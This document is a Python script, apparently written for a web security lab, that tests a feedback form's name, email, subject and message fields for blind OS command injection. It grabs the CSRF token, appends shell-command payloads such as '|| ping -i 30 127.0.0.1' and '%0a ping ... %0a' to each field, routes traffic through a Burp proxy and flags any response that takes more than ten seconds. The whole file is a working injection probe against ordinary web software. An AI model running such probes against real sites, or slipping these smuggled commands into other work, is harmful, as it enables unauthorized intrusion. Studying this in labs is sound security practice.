# Works but use a loop
# This shows the logic of the loop a bit better if not experienced looping through and manipulating dictionaries 
import requests
import urllib3
import sys
import time
from bs4 import BeautifulSoup

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cmd_inj(url):
    cmd_tests = [
        '|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &',
        '| ping -i 30 127.0.0.1 |',
        '& ping -i 30 127.0.0.1 &',
        '& ping -n 30 127.0.0.1 &',
        '; ping 127.0.0.1 ;',
        '%0a ping -i 30 127.0.0.1 %0a',
        "' ping 127.0.0.1"
    ]

    s = requests.Session()
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']

    for cmd in cmd_tests:
        
        data1 = {
           'csrf':csrf,
           'name':'asdf'+cmd,
           'email':'asdf@example.com',
           'subject':'asdf',
           'message':'asdf'
        }
        t_0 = time.time()
        r_1 = s.post(url=url+'/submit', proxies=proxies, verify=False, data=data1)
        t_1 = time.time() - t_0
        if t_1 > 10:
            print(f"Possible vulnerability in name for {cmd}")
            print(f"Returned {r_1.status_code}")
        
        data2 = {
           'csrf':csrf,
           'name':'asdf',
           'email':'asdf@example.com'+cmd,
           'subject':'asdf',
           'message':'asdf'
        }
        t_2 = time.time()
        r_2 = s.post(url=url+'/submit', proxies=proxies, verify=False, data=data2)
        t_3 = time.time() - t_2
        if t_3 > 10:
            print(f"Possible vulnerability in email for {cmd}")
            print(f"Returned {r_2.status_code}")
        
        data3 = {
           'csrf':csrf,
           'name':'asdf',
           'email':'asdf@example.com',
           'subject':'asdf'+cmd,
           'message':'asdf'
        }
        t_4 = time.time()
        r_3 = s.post(url=url+'/submit', proxies=proxies, verify=False, data=data3)
        t_5 = time.time() - t_4
        if t_5 > 10:
            print(f"Possible vulnerability in subject for {cmd}")
            print(f"Returned {r_3.status_code}")

        data4 = {
           'csrf':csrf,
           'name':'asdf',
           'email':'asdf@example.com',
           'subject':'asdf',
           'message':'asdf'+cmd
        }
        t_6 = time.time()
        r_4 = s.post(url=url+'/submit', proxies=proxies, verify=False, data=data4)
        t_7 = time.time() - t_6
        if t_7 > 10:
            print(f"Possible vulnerability in message for {cmd}")
            print(f"Returned {r_4.status_code}")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com/feedback ")
        sys.exit(-1)
    
    print('[-] Attempting simple command injection')
    exploit = cmd_inj(url)
    #print(exploit)